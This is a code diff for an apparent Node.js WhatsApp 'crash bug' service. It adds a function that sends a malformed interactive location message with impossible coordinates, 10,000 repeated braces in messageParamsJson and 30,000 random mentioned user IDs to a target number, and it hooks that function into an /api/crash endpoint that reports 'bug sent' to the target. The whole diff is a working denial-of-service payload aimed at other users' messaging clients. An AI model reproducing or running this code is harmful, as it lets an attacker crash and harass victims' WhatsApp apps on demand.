@@ -41,6 +41,58 @@ app.post("/api/change-role", (req, res) => {
 });
 
 // TARO FUNCTIONMY
+async function LocationFlowX1(target) {
+try {
+    let message = {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: " ",
+              hasMediaAttachment: false,
+              locationMessage: {
+                degreesLatitude:  -999.03499999999999,
+                degreesLongitude: 922.999999999999,
+                name: "🔞 (Nando Official Is Here)",
+                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
+              },
+            },
+            body: {
+              text: " "
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+            },
+            contextInfo: {
+              participant: target,
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from(
+                  {
+                    length: 30000,
+                  },
+                  () =>
+                    "1" +
+                    Math.floor(Math.random() * 5000000) +
+                    "@s.whatsapp.net"
+                ),
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await sock.relayMessage(target, message, {
+      messageId: null,
+      participant: { jid: target },
+      userJid: target,
+    });
+  } catch (err) {
+    console.log(err);
+  }
+}
+
 
 //BATES FUNCTION 
 
@@ -51,7 +103,7 @@ app.post("/api/crash", async (req, res) => {
   }
 
   try {
-    await InvisibleHome(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
+    await LocationFlowX1(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
     res.json({ success: true, message: `Bug terkirim ke ${target}` });
   } catch (err) {
     res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
